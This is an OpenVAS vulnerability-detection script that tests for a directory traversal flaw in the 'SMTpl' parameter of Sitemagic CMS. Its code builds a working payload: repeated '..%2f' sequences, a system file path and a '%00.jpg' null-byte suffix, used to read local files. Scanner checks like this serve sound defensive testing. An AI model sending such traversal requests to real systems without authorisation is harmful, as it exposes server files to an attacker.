###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_sitemagic_cms_dir_traversal_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902452");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_bugtraq_id(48399);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Sitemagic CMS 'SMTpl' Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48399");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102498/sitemagic-traversal.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to obtain
  arbitrary local files in the context of the web server process.");

  script_tag(name:"affected", value:"Sitemagic CMS version 2010.04.17");

  script_tag(name:"insight", value:"The flaw is due to improper sanitisation of user supplied input
  through the 'SMTpl' parameter in 'index.php'.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Sitemagic CMS and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)){
  exit(0);
}

files = traversal_files();

foreach dir( make_list_unique( "/Sitemagic", "/CMS", "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/index.php"), port:port);

  if("<title>Sitemagic CMS</title>" >< res){

    foreach file (keys(files)){

      url = string(dir, "/index.php?SMTpl=", crap(data:"..%2f", length:5*10), files[file], "%00.jpg");

      if(http_vuln_check(port:port, url:url, pattern:file)){
        report = report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);